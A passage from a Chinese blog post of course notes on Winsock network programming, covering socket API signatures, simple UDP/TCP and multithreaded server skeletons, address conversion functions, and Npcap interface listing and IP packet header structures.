class="params">)</span>;</span><br></pre></td></tr></table></figure>功能：向特定的目的地发送数据<br>正确返回实际发送的字节数，错误返回<code>SOCKET_ERROR</code>。可通过<code>WSAGetLastError</code>获取错误详情<h3 id="recvfrom"><a href="#recvfrom" class="headerlink" title="recvfrom"></a>recvfrom</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> WSAAPI <span class="title function_">recvfrom</span><span class="params">(<span class="comment">//数据报方式</span></span></span><br><span class="line"><span class="params">SOCKET   s,<span class="comment">//socket描述符</span></span></span><br><span class="line"><span class="params"><span class="type">char</span>     *buf,<span class="comment">//接收数据的缓存区</span></span></span><br><span class="line"><span class="params"><span class="type">int</span>      len,<span class="comment">//接收缓冲区的长度</span></span></span><br><span class="line"><span class="params"><span class="type">int</span>      flags,<span class="comment">//对调用的处理方式，如OOB等</span></span></span><br><span class="line"><span class="params">sockaddr *from,<span class="comment">//源socket的地址</span></span></span><br><span class="line"><span class="params"><span class="type">int</span>      *fromlen<span class="comment">//源地址的长度</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>功能：从特定的目的地接收数据<br>正确返回接收到的字节数。错误返回<code>SOCKET_ERROR</code>，可通过<code>WSAGetLastError</code>获取错误详情<h3 id="send"><a href="#send" class="headerlink" title="send"></a>send</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> WSAAPI <span class="title function_">send</span><span class="params">(<span class="comment">//流方式</span></span></span><br><span class="line"><span class="params">SOCKET     s,<span class="comment">//socket描述符</span></span></span><br><span class="line"><span class="params"><span class="type">const</span> <span class="type">char</span> *buf, <span class="comment">//发送数据缓存区</span></span></span><br><span class="line"><span class="params"><span class="type">int</span>        len,<span class="comment">//发送缓冲区的长度</span></span></span><br><span class="line"><span class="params"><span class="type">int</span>        flags <span class="comment">//对调用的处理方式，如OOB等</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>功能：向远程socket发送数据<br>正确返回实际发送的字节数。错误返回<code>SOCKET_ERROR</code>。可通过<code>WSAGetLastError</code>获取错误详情<h3 id="recv"><a href="#recv" class="headerlink" title="recv"></a>recv</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> WSAAPI <span class="title function_">recv</span><span class="params">(</span></span><br><span class="line"><span class="params">  SOCKET s,<span class="comment">//socket描述符。</span></span></span><br><span class="line"><span class="params">  <span class="type">char</span>   *buf,<span class="comment">//发送数据缓存区</span></span></span><br><span class="line"><span class="params">  <span class="type">int</span>    len,<span class="comment">//发送缓冲区的长度</span></span></span><br><span class="line"><span class="params">  <span class="type">int</span>    flags<span class="comment">//对调用的处理方式，如OOB等</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>功能：从远程socket接收数据<br>正确返回实际接收的字节数。错误返回<code>SOCKET_ERROR</code>。可通过<code>WSAGetLastError</code>获取错误详情<h3 id="closesocket"><a href="#closesocket" class="headerlink" title="closesocket"></a>closesocket</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> WSAAPI <span class="title function_">closesocket</span><span class="params">(</span></span><br><span class="line"><span class="params">SOCKET s<span class="comment">//socket描述符</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>功能：关闭一个存在的socket<br>正确返回0。错误返回<code>SOCKET_ERROR</code>，可通过<code>WSAGetLastError</code>获取错误详情<h3 id="CreateThread"><a href="#CreateThread" class="headerlink" title="CreateThread"></a>CreateThread</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HANDLE <span class="title function_">CreateThread</span><span class="params">(<span class="comment">//创建线程</span></span></span><br><span class="line"><span class="params">LPSECURITY_ATTRIBUTES   lpThreadAttributes,<span class="comment">//返回句柄能否被继承。NULL为不能继承</span></span></span><br><span class="line"><span class="params">SIZE_T                  dwStackSize,<span class="comment">//堆栈的初始大小。0为缺省大小</span></span></span><br><span class="line"><span class="params">LPTHREAD_START_ROUTINE  lpStartAddress,<span class="comment">//新线程的开始执行地址。自己线程函数的开始地址</span></span></span><br><span class="line"><span class="params">__drv_aliasesMem LPVOID lpParameter,<span class="comment">//传递给线程的参数</span></span></span><br><span class="line"><span class="params">DWORD                   dwCreationFlags,<span class="comment">//控制线程的标志。0为立即执行</span></span></span><br><span class="line"><span class="params">LPDWORD                 lpThreadId<span class="comment">//指向进程标识符的指针。NULL为不返回该指针</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>正确返回新创建线程的句柄。错误返回<code>NULL</code>，可通过<code>GetLastError</code>获取错误详情。<br><code>CloseThread()</code>函数并不是把线程结束了，而是把线程句柄结束了。线程执行完就会return，就当做一个函数执行完一样退出。在这里close的意思是主进程放弃对线程的控制了。<h2 id="常用数据结构"><a href="#常用数据结构" class="headerlink" title="常用数据结构"></a>常用数据结构</h2><h3 id="SOCKADDR"><a href="#SOCKADDR" class="headerlink" title="SOCKADDR"></a>SOCKADDR</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> &#123;</span></span><br><span class="line">  u_short sa_family;</span><br><span class="line">  <span class="type">char</span>    sa_data[<span class="number">14</span>];</span><br><span class="line">&#125; SOCKADDR, *PSOCKADDR, *LPSOCKADDR;</span><br></pre></td></tr></table></figure><h3 id="SOCKADDR-IN"><a href="#SOCKADDR-IN" class="headerlink" title="SOCKADDR_IN"></a>SOCKADDR_IN</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> &#123;</span></span><br><span class="line">  <span class="type">short</span>          sin_family;</span><br><span class="line">  u_short        sin_port;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span></span><br><span class="line">  <span class="type">char</span>           sin_zero[<span class="number">8</span>];</span><br><span class="line">&#125; SOCKADDR_IN, *PSOCKADDR_IN, *LPSOCKADDR_IN;</span><br></pre></td></tr></table></figure><h3 id="in-addr"><a href="#in-addr" class="headerlink" title="in_addr"></a>in_addr</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">      u_char s_b1;</span><br><span class="line">      u_char s_b2;</span><br><span class="line">      u_char s_b3;</span><br><span class="line">      u_char s_b4;</span><br><span class="line">    &#125; S_un_b;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">      u_short s_w1;</span><br><span class="line">      u_short s_w2;</span><br><span class="line">    &#125; S_un_w;</span><br><span class="line">    u_long S_addr;</span><br><span class="line">  &#125; S_un;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="网络序和主机序"><a href="#网络序和主机序" class="headerlink" title="网络序和主机序"></a>网络序和主机序</h2></li></ul><p><img src="/2023/03/21/wang-luo-bian-cheng/1666264175792-74927695-1db1-4d68-918a-8fa886e39bac.png" class="lazyload placeholder" data-srcset="/2023/03/21/wang-luo-bian-cheng/1666264175792-74927695-1db1-4d68-918a-8fa886e39bac.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="编程示例"><a href="#编程示例" class="headerlink" title="编程示例"></a>编程示例</h2><h3 id="数据报"><a href="#数据报" class="headerlink" title="数据报"></a>数据报</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    WSAStartup(wVersionRequested, &amp;wsaData);</span><br><span class="line">    SOCKET sockClient = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>);</span><br><span class="line">    SOCKADDR_IN addrSrv;</span><br><span class="line">    sendto(sockClient, sendBuf, sendlen, <span class="number">0</span>, (SOCKADDR *)&amp;addrSrv, len);</span><br><span class="line">    recvfrom(sockClient, recvBuf, <span class="number">50</span>, <span class="number">0</span>, (SOCKADDR *)&amp;addrSrv, &amp;len);</span><br><span class="line">    closesocket(sockClient);</span><br><span class="line">    WSACleanup();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    WSAStartup(wVersionRequested, &amp;wsaData);</span><br><span class="line">    SOCKET sockSrv = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>);</span><br><span class="line">    SOCKADDR_IN addrSrv;</span><br><span class="line">    bind(sockSrv, (SOCKADDR*)&amp;addrSrv, <span class="keyword">sizeof</span>(SOCKADDR));</span><br><span class="line">    SOCKADDR_IN addrClient;<span class="comment">//远程IP地址</span></span><br><span class="line">    loop &#123;</span><br><span class="line">        recvfrom(sockSrv, recvBuf, <span class="number">50</span>, <span class="number">0</span>,(SOCKADDR *)&amp;addrClient,&amp;len);</span><br><span class="line">        sendto(sockSrv, sendBuf, sendlen, <span class="number">0</span>,(SOCKADDR *) &amp;addrClient,len);</span><br><span class="line">    &#125;</span><br><span class="line">    closesocket(sockClient);</span><br><span class="line">    WSACleanup();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="流式"><a href="#流式" class="headerlink" title="流式"></a>流式</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    WSAStartup(wVersionRequested, &amp;wsaData);</span><br><span class="line">    SOCKET sockClient = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    connect(sockClient, (SOCKADDR*)&amp;addrSrv, <span class="keyword">sizeof</span>(SOCKADDR));</span><br><span class="line">    recv(sockClient, recvBuf, <span class="number">50</span>, <span class="number">0</span>);</span><br><span class="line">    send(sockClient, <span class="string">&quot;hello&quot;</span>, sendlen, <span class="number">0</span>);</span><br><span class="line">    closesocket(sockClient);</span><br><span class="line">    WSACleanup();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    WSAStartup(wVersionRequested, &amp;wsaData);</span><br><span class="line">    SOCKET sockSrv = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    bind(sockSrv, (SOCKADDR*)&amp;addrSrv, <span class="keyword">sizeof</span>(SOCKADDR));</span><br><span class="line">    listen(sockSrv, <span class="number">5</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        SOCKET sockConn = accept(sockSrv, (SOCKADDR*)&amp;addrClient, &amp;len);</span><br><span class="line">        send(sockConn, sendBuf, <span class="built_in">strlen</span>, <span class="number">0</span>);</span><br><span class="line">        recv(sockConn, recvBuf, <span class="number">50</span>, <span class="number">0</span>);</span><br><span class="line">        closesocket(sockConn);</span><br><span class="line">    &#125;</span><br><span class="line">    closesocket(sockSrv);</span><br><span class="line">    WSACleanup();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="多线程流式"><a href="#多线程流式" class="headerlink" title="多线程流式"></a>多线程流式</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    WSAStartup(wVersionRequested, &amp;wsaData);</span><br><span class="line">    SOCKET sockSrv = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    bind(sockSrv, (SOCKADDR*)&amp;addrSrv, <span class="keyword">sizeof</span>(SOCKADDR));</span><br><span class="line">    listen(sockSrv, <span class="number">5</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        SOCKET sockConn = accept(sockSrv, (SOCKADDR*)&amp;addrClient, &amp;len);</span><br><span class="line">        hThread = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, handlerRequest,LPVOID(sockConn), <span class="number">0</span>, &amp;dwThreadId);</span><br><span class="line">        CloseHandle(hThread);</span><br><span class="line">    &#125;</span><br><span class="line">    closesocket(sockSrv);</span><br><span class="line">    WSACleanup();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">handlerRequest</span><span class="params">(LPVOID lparam)</span></span><br><span class="line">&#123;</span><br><span class="line">    SOCKET ClientSocket = (SOCKET)(LPVOID)lparam;</span><br><span class="line">    send(ClientSocket, sendBuf, <span class="built_in">strlen</span>, <span class="number">0</span>);</span><br><span class="line">    recv(ClientSocket, recvBuf, <span class="number">50</span>, <span class="number">0</span>);</span><br><span class="line">    closesocket(ClientSocket);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题解答"><a href="#问题解答" class="headerlink" title="问题解答"></a>问题解答</h2><h3 id="将sin-addr设置为INADDR-ANY的含义是什么？"><a href="#将sin-addr设置为INADDR-ANY的含义是什么？" class="headerlink" title="将sin_addr设置为INADDR_ANY的含义是什么？"></a>将sin_addr设置为INADDR_ANY的含义是什么？</h3><p><code>INADDR_ANY</code>转换过来就是<code>0.0.0.0</code>，泛指本机的意思，也就是表示本机的所有IP，因为有些机子不止一块网卡，多网卡的情况下，这个就表示所有网卡ip地址的意思。<br>比如一台电脑有3块网卡，分别连接三个网络，那么这台电脑就有3个ip地址了，如果某个应用程序需要监听某个端口，那他要监听哪个网卡地址的端口呢？<br>如果绑定某个具体的ip地址，你只能监听你所设置的ip地址所在的网卡的端口，其它两块网卡无法监听端口，如果我需要三个网卡都监听，那就需要绑定3个ip，也就等于需要管理3个套接字进行数据交换，这样岂不是很繁琐？<br>所以出现INADDR_ANY，你只需绑定INADDR_ANY，管理一个套接字就行，不管数据是从哪个网卡过来的，只要是绑定的端口号过来的数据，都可以接收到。</p><h3 id="inet-addr"><a href="#inet-addr" class="headerlink" title="inet_addr()"></a>inet_addr()</h3><p><code>inet_addr()</code>的功能是将一个点分十进制的IP转换成一个长整数型数（u_long类型）<br><strong>原型</strong>：in_addr_t inet_addr(const char *cp);<br><strong>参数：</strong>字符串，一个点分十进制的IP地址<br><strong>返回值</strong>：如果正确执行将返回一个无符号长整数型数。如果传入的字符串不是一个合法的IP地址，将返回INADDR_NONE。<br><strong>使用：</strong>windows系统包含在头文件<code>winsock.h</code>中<br>in_addr_t 一般为 32位的unsigned int，其字节顺序为网络顺序（network byte ordered)，即该无符号整数采用大端字节序，”127.0.0.1”在内存中表示为7f 00 00 01。</p><h3 id="inet-ntoa"><a href="#inet-ntoa" class="headerlink" title="inet_ntoa()"></a>inet_ntoa()</h3><p><img src="/2023/03/21/wang-luo-bian-cheng/1666267854261-9a37197b-47e5-459d-a132-e5dfeac845f5.png" class="lazyload placeholder" data-srcset="/2023/03/21/wang-luo-bian-cheng/1666267854261-9a37197b-47e5-459d-a132-e5dfeac845f5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"><br>函数声明：char *inet_ntoa(struct in_addr in);<br>将32位网络字节序的二进制IP地址转换成相应的点分十进制的IP地址（返回<a href="https://baike.baidu.com/item/%E7%82%B9%E5%88%86%E5%8D%81%E8%BF%9B%E5%88%B6?fromModule=lemma_inlink">点分十进制</a>的字符串在<a href="https://baike.baidu.com/item/%E9%9D%99%E6%80%81%E5%86%85%E5%AD%98/1010331?fromModule=lemma_inlink">静态内存</a>中的<a href="https://baike.baidu.com/item/%E6%8C%87%E9%92%88/2878304?fromModule=lemma_inlink">指针</a>)。</p><h1 id="Npcap捕获IP数据包"><a href="#Npcap捕获IP数据包" class="headerlink" title="Npcap捕获IP数据包"></a>Npcap捕获IP数据包</h1><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(1)<span class="comment">//进入字节对齐方式</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">FrameHeader_t</span>  &#123;</span><span class="comment">//帧首部</span></span><br><span class="line">    BYTEDesMAC[<span class="number">6</span>];<span class="comment">// 目的地址</span></span><br><span class="line">    BYTE SrcMAC[<span class="number">6</span>];<span class="comment">// 源地址</span></span><br><span class="line">    WORDFrameType;<span class="comment">// 帧类型</span></span><br><span class="line">&#125; FrameHeader_t;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">IPHeader_t</span> &#123;</span><span class="comment">//IP首部</span></span><br><span class="line">BYTEVer_HLen;</span><br><span class="line">BYTETOS;</span><br><span class="line">WORDTotalLen;</span><br><span class="line">WORDID;</span><br><span class="line">WORDFlag_Segment;</span><br><span class="line">BYTETTL;</span><br><span class="line">BYTEProtocol;</span><br><span class="line">WORDChecksum;</span><br><span class="line">ULONGSrcIP;</span><br><span class="line">ULONGDstIP;</span><br><span class="line">&#125; IPHeader_t;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Data_t</span> &#123;</span><span class="comment">//包含帧首部和IP首部的数据包</span></span><br><span class="line">FrameHeader_tFrameHeader;</span><br><span class="line">IPHeader_tIPHeader;</span><br><span class="line">&#125; Data_t;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack()<span class="comment">//恢复缺省对齐方式</span></span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">pcap_if</span> <span class="title">pcap_if_t</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pcap_if</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pcap_if</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">char</span> *name;</span><br><span class="line"><span class="type">char</span> *description;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pcap_addr</span> *<span class="title">addresses</span>;</span></span><br><span class="line">u_int flags;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pcap_addr</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pcap_addr</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">addr</span>;</span><span class="comment">//IP地址</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">netmask</span>;</span><span class="comment">//网络掩码</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">broadaddr</span>;</span><span class="comment">//广播地址</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">dstaddr</span>;</span><span class="comment">//目的地址</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="获取设备列表"><a href="#获取设备列表" class="headerlink" title="获取设备列表"></a>获取设备列表</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pcap_findalldevs_ex</span><span class="params">(</span></span><br><span class="line"><span class="params"><span class="type">char</span> *source,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span>pcap_rmtauth auth,</span></span><br><span class="line"><span class="params"><span class="type">pcap_if_t</span> **alldevs,</span></span><br><span class="line"><span class="params"><span class="type">char</span> *errbuf</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><h3 id="释放设备列表"><a href="#释放设备列表" class="headerlink" title="释放设备列表"></a>释放设备列表</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">pcap_freealldevs</span><span class="params">(<span class="type">pcap_if_t</span> *alldevsp)</span>;</span><br></pre></td></tr></table></figure><h3 id="打开网络接口"><a href="#打开网络接口" class="headerlink" title="打开网络接口"></a>打开网络接口</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pcap_t</span>* <span class="title function_">pcap_open</span><span class="params">(</span></span><br><span class="line"><span class="params"><span class="type">const</span> <span class="type">char</span> *source,</span></span><br><span class="line"><span class="params"><span class="type">int</span> snaplen,</span></span><br><span class="line"><span class="params"><span class="type">int</span> flags,</span></span><br><span class="line"><span class="params"><span class="type">int</span> read_timeout,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> pcap_rmtauth *auth,</span></span><br><span class="line"><span class="params"><span class="type">char</span> *errbuf</span></span><br><span class="line"><span class="params">&#125;;</span></span><br></pre></td></tr></table></figure><h3 id="捕获网络数据包"><a href="#捕获网络数据包" class="headerlink" title="捕获网络数据包"></a>捕获网络数据包</h3><h4 id="利用回调函数捕获"><a href="#利用回调函数捕获" class="headerlink" title="利用回调函数捕获"></a>利用回调函数捕获</h4><p><code>pcap_dispatch()</code>read_timeout到时返回<br><code>pcap_loop()</code>捕获到cnt个数据包后返回</p><h4 id="直接捕获"><a href="#直接捕获" class="headerlink" title="直接捕获"></a>直接捕获</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pcap_next_ex</span><span class="params">(</span></span><br><span class="line"><span class="params"><span class="type">pcap_t</span>* p,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> pcap_pkthdr **pkt_header,</span></span><br><span class="line"><span class="params">u_char ** pkt_data</span></span><br><span class="line"><span class="params">&#125;;</span></span><br></pre></td></tr></table></figure><h2 id="示例程序——本机接口和IP地址的获取"><a href="#示例程序——本机接口和IP地址的获取" class="headerlink" title="示例程序——本机接口和IP地址的获取"></a>示例程序——本机接口和IP地址的获取</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pcap_if_t</span>*alldevs;                <span class="comment">//指向设备链表首部的指针</span></span><br><span class="line"><span class="type">pcap_if_t</span>*d;</span><br><span class="line"><span class="type">pcap_addr_t</span>*a;</span><br><span class="line"><span class="type">char</span>errbuf[PCAP_ERRBUF_SIZE];<span class="comment">//错误信息缓冲区</span></span><br><span class="line"><span class="comment">//获得本机的设备列表</span></span><br><span class="line"><span class="keyword">if</span> (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, <span class="comment">//获取本机的接口设备</span></span><br><span class="line"><span class="literal">NULL</span>,       <span class="comment">//无需认证</span></span><br><span class="line">&amp;alldevs,        <span class="comment">//指向设备列表首部</span></span><br><span class="line">errbuf      <span class="comment">//出错信息保存缓存区</span></span><br><span class="line">) == <span class="number">-1</span>)</span><br><span class="line">&#123;……<span class="comment">//错误处理      &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(d= alldevs; d != <span class="literal">NULL</span>; d= d-&gt;next)      <span class="comment">//显示接口列表</span></span><br><span class="line">&#123;</span><br><span class="line">……<span class="comment">//利用d-&gt;name获取该网络接口设备的名字</span></span><br><span class="line">……<span class="comment">//利用d-&gt;description获取该网络接口设备的描述信息</span></span><br><span class="line"><span class="comment">//获取该网络接口设备的IP地址信息</span></span><br><span class="line"><span class="keyword">for</span>(a=d-&gt;addresses; a!=<span class="literal">NULL</span>; a=addr-&gt;next)</span><br><span class="line"><span class="keyword">if</span> (a-&gt;addr-&gt;sa_family==AF_INET)  <span class="comment">//判断该地址是否IP地址</span></span><br><span class="line">&#123;</span><br><span class="line">……<span class="comment">//利用a-&gt;addr获取IP地址</span></span><br><span class="line">……<span class="comment">//利用a-&gt;netmask获取网络掩码</span></span><br><span class="line">……<span class="comment">//利用a-&gt;broadaddr获取广播地址</span></span><br><span class="line">……<span class="comment">//利用a-&gt;dstaddr)获取目的地址</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">pcap_freealldevs(alldevs); <span class="comment">//释放设备列表</span></span><br></pre></td></tr></table></figure><h3 